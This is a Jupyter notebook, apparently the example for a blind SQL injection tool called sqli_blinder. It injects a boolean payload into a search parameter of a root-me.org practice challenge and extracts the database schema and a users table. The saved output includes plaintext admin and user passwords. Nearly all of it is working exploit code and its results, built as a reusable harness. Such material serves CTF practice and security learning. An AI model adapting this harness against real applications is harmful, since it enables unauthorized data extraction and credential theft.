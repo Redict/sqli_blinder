{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import sqli_blinder\n",
    "import requests"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "def example_func(sql):\n",
    "    \"\"\"this function must return True for sql=`1=1` and False for sql=`1=0`\"\"\"\n",
    "    \n",
    "    http_proxy   = \"http://localhost:8080\"\n",
    "    proxyDict = { \n",
    "                 \"https\"   : http_proxy,    \n",
    "                 \"http\"   : http_proxy\n",
    "                }\n",
    "    proxyDict = None\n",
    "\n",
    "    burp0_url = \"http://challenge01.root-me.org:80/web-serveur/ch19/?action=recherche\"\n",
    "    burp0_headers = {\"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:72.0) Gecko/20100101 Firefox/72.0\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\", \"Accept-Language\": \"en-US,en;q=0.5\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Origin\": \"http://challenge01.root-me.org\", \"Connection\": \"close\", \"Referer\": \"http://challenge01.root-me.org/web-serveur/ch19/?action=recherche\", \"Upgrade-Insecure-Requests\": \"1\"}\n",
    "    burp0_data = {\"recherche\": \"f' or (%s) -- \" % sql}\n",
    "    r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data,proxies=proxyDict)\n",
    "    \n",
    "    if r.status_code != 200:\n",
    "        raise Exception('code: %d, ошибка sql: %s'%(r.status_code,sql))\n",
    "    if \"Unable to prepare statement\" in r.text:\n",
    "        raise Exception('code: %d, ошибка sql: %s'%(r.status_code,sql))\n",
    "    if \"News system\" in r.text:\n",
    "        return True\n",
    "    else:\n",
    "        return False"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "sqlib = sqli_blinder.SQLiBlinder(example_func,'sqlite')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "length: 62\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "'CREATE TABLE users(username TEXT, password TEXT, Year INTEGER)'"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sqlib.get_string('sqlite_master','sql',1)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "count 3\n",
      "length: 5\n",
      "length: 8\n",
      "['admin', '8Wbhkzmd']\n",
      "length: 5\n",
      "length: 8\n",
      "['user1', 'OK4dSoYE']\n",
      "length: 5\n",
      "length: 15\n",
      "['user2', 'c4K04dtIaJsuWdi']\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "[['admin', '8Wbhkzmd'], ['user1', 'OK4dSoYE'], ['user2', 'c4K04dtIaJsuWdi']]"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sqlib.get(['sql'],'sqlite_master')"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
